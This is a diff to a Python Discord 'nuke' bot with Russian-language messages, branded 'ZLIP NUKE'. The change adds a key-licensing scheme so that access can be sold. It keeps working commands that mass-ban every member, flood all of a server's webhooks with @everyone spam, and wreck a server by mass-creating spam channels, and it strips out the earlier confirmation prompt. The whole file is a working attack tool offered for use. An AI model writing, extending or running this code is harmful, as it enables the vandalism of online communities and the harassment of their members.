@@ -3,8 +3,9 @@ from discord.ext import commands
 import asyncio
 import time
 import os
-import random
+import json
 import aiohttp
+from datetime import datetime
 
 bot = commands.Bot(command_prefix='-', intents=discord.Intents.all(), help_command=None)
 
@@ -13,10 +14,39 @@ start_time = 0
 rate_limit_hits = 0
 webhook_spam_active = False
 
+# === АДМИН ПАНЕЛЬ (только ты) ===
+OWNER_ID = 123456789012345678  # ТВОЙ ID (замени)
+
+# === КЛЮЧИ ===
+keys_db = "keys.json"
+
+def load_keys():
+    try:
+        with open(keys_db, "r") as f:
+            return json.load(f)
+    except:
+        return {}
+
+def save_keys(keys):
+    with open(keys_db, "w") as f:
+        json.dump(keys, f)
+
+keys_data = load_keys()
+
+def is_owner(ctx):
+    return ctx.author.id == OWNER_ID
+
+def has_valid_key(user_id):
+    user_id = str(user_id)
+    if user_id in keys_data and keys_data[user_id] == "activated":
+        return True
+    return False
+
 @bot.event
 async def on_ready():
     print(f'✅ {bot.user} готов к уничтожению')
     print(f'🌐 Запущен на {len(bot.guilds)} серверах')
+    print(f'👑 Владелец: {OWNER_ID}')
     
     await bot.change_presence(
         status=discord.Status.idle,
@@ -29,31 +59,160 @@ async def on_command_error(ctx, error):
         return
     await ctx.send(f"❌ Ошибка: {error}")
 
+# === ТОЛЬКО ДЛЯ ВЛАДЕЛЬЦА ===
 @bot.command()
-async def help(ctx):
+async def admin(ctx):
+    if not is_owner(ctx):
+        await ctx.send("❌ Только для владельца")
+        return
+    
     embed = discord.Embed(
-        title="🔥 GVK NUKE TOOL 🔥",
-        description="Команды для уничтожения",
-        color=discord.Color.red()
+        title="👑 АДМИН ПАНЕЛЬ",
+        description="Управление ботом",
+        color=discord.Color.gold()
     )
-    embed.add_field(name="-dszlip", value="Запускает нюк сервера", inline=False)
-    embed.add_field(name="-status", value="Показывает статус бота", inline=False)
-    embed.add_field(name="-webhook", value="Спамит вебхуками", inline=False)
-    embed.add_field(name="-ping", value="Проверка задержки", inline=False)
+    embed.add_field(name="-genkey @user", value="Выдать ключ пользователю (можно по ID)", inline=False)
+    embed.add_field(name="-genkey ID", value="Выдать ключ по ID (если не на сервере)", inline=False)
+    embed.add_field(name="-keys", value="Список всех ключей", inline=False)
+    embed.add_field(name="-delkey @user", value="Удалить ключ у пользователя", inline=False)
     embed.add_field(name="-servers", value="Список серверов бота", inline=False)
-    embed.add_field(name="-massban", value="Бан всех участников", inline=False)
+    embed.add_field(name="-broadcast", value="Рассылка всем серверам", inline=False)
     embed.set_footer(text="MOGGED BY ZLIP")
     await ctx.send(embed=embed)
 
 @bot.command()
-async def ping(ctx):
-    latency = round(bot.latency * 1000)
-    await ctx.send(f"🏓 Понг! Задержка: {latency}мс")
+async def genkey(ctx, arg = None):
+    if not is_owner(ctx):
+        return
+    
+    if not arg:
+        await ctx.send("❌ Укажи пользователя или ID: -genkey @user или -genkey 123456789")
+        return
+    
+    user_id = None
+    user_name = "Неизвестный"
+    
+    # Пробуем получить пользователя по упоминанию
+    try:
+        if arg.startswith('<@') and arg.endswith('>'):
+            user_id = arg.replace('<@', '').replace('>', '').replace('!', '')
+        else:
+            # Пробуем как ID
+            user_id = int(arg)
+    except:
+        await ctx.send("❌ Неверный формат. Используй @user или ID")
+        return
+    
+    user_id = str(user_id)
+    
+    # Пытаемся получить инфо о пользователе
+    try:
+        user = await bot.fetch_user(int(user_id))
+        user_name = user.name
+    except:
+        user_name = f"Пользователь {user_id}"
+    
+    keys_data[user_id] = "activated"
+    save_keys(keys_data)
+    
+    embed = discord.Embed(
+        title="✅ КЛЮЧ ВЫДАН",
+        description=f"Пользователь {user_name} получил доступ",
+        color=discord.Color.green()
+    )
+    embed.add_field(name="ID", value=user_id, inline=False)
+    embed.add_field(name="Статус", value="Активирован", inline=False)
+    await ctx.send(embed=embed)
+    
+    # Пытаемся отправить в личку
+    try:
+        user = await bot.fetch_user(int(user_id))
+        await user.send(f"🔥 Ты получил доступ к боту ZLIP NUKE!\nИспользуй `-dszlip` для нюка")
+    except:
+        await ctx.send(f"⚠️ Не удалось отправить в личку пользователю {user_name}")
+
+@bot.command()
+async def keys(ctx):
+    if not is_owner(ctx):
+        return
+    
+    if not keys_data:
+        await ctx.send("📭 Нет активированных ключей")
+        return
+    
+    users = ""
+    for uid, status in keys_data.items():
+        try:
+            user = await bot.fetch_user(int(uid))
+            users += f"- {user.name} (ID: {uid}) - {status}\n"
+        except:
+            users += f"- {uid} - {status}\n"
+    
+    embed = discord.Embed(
+        title="🔑 АКТИВНЫЕ КЛЮЧИ",
+        description=users,
+        color=discord.Color.blue()
+    )
+    embed.set_footer(text=f"Всего: {len(keys_data)}")
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def delkey(ctx, arg = None):
+    if not is_owner(ctx):
+        return
+    
+    if not arg:
+        await ctx.send("❌ Укажи пользователя или ID: -delkey @user или -delkey 123456789")
+        return
+    
+    user_id = None
+    
+    try:
+        if arg.startswith('<@') and arg.endswith('>'):
+            user_id = arg.replace('<@', '').replace('>', '').replace('!', '')
+        else:
+            user_id = int(arg)
+    except:
+        await ctx.send("❌ Неверный формат")
+        return
+    
+    user_id = str(user_id)
+    
+    try:
+        user = await bot.fetch_user(int(user_id))
+        user_name = user.name
+    except:
+        user_name = f"Пользователь {user_id}"
+    
+    if user_id in keys_data:
+        del keys_data[user_id]
+        save_keys(keys_data)
+        await ctx.send(f"✅ Ключ у {user_name} удален")
+    else:
+        await ctx.send(f"❌ У {user_name} нет ключа")
+
+@bot.command()
+async def broadcast(ctx, *, message):
+    if not is_owner(ctx):
+        return
+    
+    await ctx.send(f"📡 Рассылка началась...")
+    
+    sent = 0
+    for guild in bot.guilds:
+        try:
+            channel = guild.system_channel or guild.text_channels[0]
+            await channel.send(f"📢 **ОБЪЯВЛЕНИЕ ОТ ВЛАДЕЛЬЦА**\n{message}")
+            sent += 1
+            await asyncio.sleep(0.5)
+        except:
+            pass
+    
+    await ctx.send(f"✅ Отправлено на {sent} серверов")
 
 @bot.command()
 async def servers(ctx):
-    if not ctx.author.guild_permissions.administrator:
-        await ctx.send("❌ Нет прав")
+    if not is_owner(ctx):
         return
     
     server_list = ""
@@ -68,12 +227,61 @@ async def servers(ctx):
     else:
         await ctx.send(f"📊 Серверы бота:\n```{server_list}```")
 
+# === КОМАНДЫ ДЛЯ ВСЕХ С КЛЮЧОМ ===
+@bot.command()
+async def help(ctx):
+    if not has_valid_key(ctx.author.id) and not is_owner(ctx):
+        await ctx.send("❌ У тебя нет доступа! Купи ключ у владельца")
+        return
+    
+    embed = discord.Embed(
+        title="🔥 ZLIP NUKE TOOL 🔥",
+        description="Команды для уничтожения",
+        color=discord.Color.red()
+    )
+    embed.add_field(name="-dszlip", value="Запускает нюк сервера", inline=False)
+    embed.add_field(name="-status", value="Показывает статус бота", inline=False)
+    embed.add_field(name="-ping", value="Проверка задержки", inline=False)
+    embed.add_field(name="-webhook", value="Спамит вебхуками", inline=False)
+    embed.add_field(name="-massban", value="Бан всех участников", inline=False)
+    embed.set_footer(text="MOGGED BY ZLIP | Купи ключ у владельца")
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def ping(ctx):
+    if not has_valid_key(ctx.author.id) and not is_owner(ctx):
+        await ctx.send("❌ У тебя нет доступа! Купи ключ у владельца")
+        return
+    
+    latency = round(bot.latency * 1000)
+    await ctx.send(f"🏓 Понг! Задержка: {latency}мс")
+
+@bot.command()
+async def status(ctx):
+    if not has_valid_key(ctx.author.id) and not is_owner(ctx):
+        await ctx.send("❌ У тебя нет доступа! Купи ключ у владельца")
+        return
+    
+    embed = discord.Embed(
+        title="🔥 СТАТУС БОТА 🔥",
+        color=discord.Color.red()
+    )
+    embed.add_field(name="Бот", value=bot.user.name, inline=True)
+    embed.add_field(name="Серверов", value=len(bot.guilds), inline=True)
+    embed.add_field(name="Пинг", value=f"{round(bot.latency * 1000)}мс", inline=True)
+    embed.set_footer(text="MOGGED BY ZLIP")
+    await ctx.send(embed=embed)
+
 @bot.command()
 async def webhook(ctx):
     global webhook_spam_active
     
+    if not has_valid_key(ctx.author.id) and not is_owner(ctx):
+        await ctx.send("❌ У тебя нет доступа! Купи ключ у владельца")
+        return
+    
     if not ctx.author.guild_permissions.administrator:
-        await ctx.send("❌ Нет прав")
+        await ctx.send("❌ Нужны права администратора!")
         return
     
     webhook_spam_active = not webhook_spam_active
@@ -81,9 +289,19 @@ async def webhook(ctx):
     if webhook_spam_active:
         await ctx.send("🌐 Спам вебхуками АКТИВИРОВАН")
         
-        webhook_urls = [
-            "https://discord.com/api/webhooks/...",
-        ]
+        webhook_urls = []
+        for channel in ctx.guild.text_channels:
+            try:
+                webhooks = await channel.webhooks()
+                for webhook in webhooks:
+                    webhook_urls.append(webhook.url)
+            except:
+                pass
+        
+        if not webhook_urls:
+            await ctx.send("❌ На сервере нет вебхуков! Создай их сначала")
+            webhook_spam_active = False
+            return
         
         spam_text = "@everyone\n**MOGGED BY ZLIP**\nhttps://guns.lol/dszlip"
         
@@ -96,35 +314,52 @@ async def webhook(ctx):
                             await session.post(url, json=data)
                     except:
                         pass
-                await asyncio.sleep(0.5)
+                await asyncio.sleep(0.1)
         
         bot.loop.create_task(spam_webhooks())
     else:
         await ctx.send("🛑 Спам вебхуками ОСТАНОВЛЕН")
 
 @bot.command()
-async def dszlip(ctx):
-    global channel_counter, start_time, rate_limit_hits
-    channel_counter = 0
-    start_time = time.time()
-    rate_limit_hits = 0
+async def massban(ctx):
+    if not has_valid_key(ctx.author.id) and not is_owner(ctx):
+        await ctx.send("❌ У тебя нет доступа! Купи ключ у владельца")
+        return
     
     if not ctx.author.guild_permissions.administrator:
         await ctx.send("❌ Нужны права администратора!")
         return
     
-    confirm_msg = await ctx.send("⚠️ **ПОДТВЕРДИ НЮК**\nНапиши `ДА` в течение 10 секунд")
+    await ctx.send("⚠️ БАН ВСЕХ УЧАСТНИКОВ...")
     
-    def check(m):
-        return m.author == ctx.author and m.channel == ctx.channel and m.content.upper() == "ДА"
+    banned = 0
+    for member in ctx.guild.members:
+        if not member.bot:
+            try:
+                await member.ban(reason="MOGGED BY ZLIP")
+                banned += 1
+            except:
+                pass
+            await asyncio.sleep(0.01)
     
-    try:
-        await bot.wait_for('message', timeout=10.0, check=check)
-    except asyncio.TimeoutError:
-        await ctx.send("❌ Нюк отменен")
+    await ctx.send(f"✅ Забанено: {banned} участников")
+
+@bot.command()
+async def dszlip(ctx):
+    if not has_valid_key(ctx.author.id) and not is_owner(ctx):
+        await ctx.send("❌ У тебя нет доступа! Купи ключ у владельца")
         return
     
-    await ctx.send("🔥 **НЮК ЗАПУЩЕН**")
+    if not ctx.author.guild_permissions.administrator:
+        await ctx.send("❌ Нужны права администратора!")
+        return
+    
+    await ctx.send("**ZLIP EBET**")
+    
+    global channel_counter, start_time, rate_limit_hits
+    channel_counter = 0
+    start_time = time.time()
+    rate_limit_hits = 0
     
     guild = ctx.guild
     
@@ -257,42 +492,9 @@ https://guns.lol/dszlip
     print("="*50)
     
     try:
-        await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\nСоздано: {created} каналов\nСообщений: {created * 5}\nСкорость: {created / (time.time() - start_time):.1f}/сек")
+        await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\nСоздано: {created} каналов\nСообщений: {created * 5}")
     except:
         pass
-
-@bot.command()
-async def status(ctx):
-    embed = discord.Embed(
-        title="🔥 СТАТУС БОТА 🔥",
-        color=discord.Color.red()
-    )
-    embed.add_field(name="Бот", value=bot.user.name, inline=True)
-    embed.add_field(name="Серверов", value=len(bot.guilds), inline=True)
-    embed.add_field(name="Пинг", value=f"{round(bot.latency * 1000)}мс", inline=True)
-    embed.add_field(name="Команда", value="-dszlip", inline=True)
-    embed.set_footer(text="MOGGED BY ZLIP")
-    await ctx.send(embed=embed)
-
-@bot.command()
-async def massban(ctx):
-    if not ctx.author.guild_permissions.administrator:
-        await ctx.send("❌ Нет прав")
-        return
-    
-    await ctx.send("⚠️ БАН ВСЕХ УЧАСТНИКОВ...")
-    
-    banned = 0
-    for member in ctx.guild.members:
-        if not member.bot:
-            try:
-                await member.ban(reason="MOGGED BY ZLIP")
-                banned += 1
-            except:
-                pass
-            await asyncio.sleep(0.01)
-    
-    await ctx.send(f"✅ Забанено: {banned} участников")
 
 import os
 bot.run(os.environ['TOKEN'])
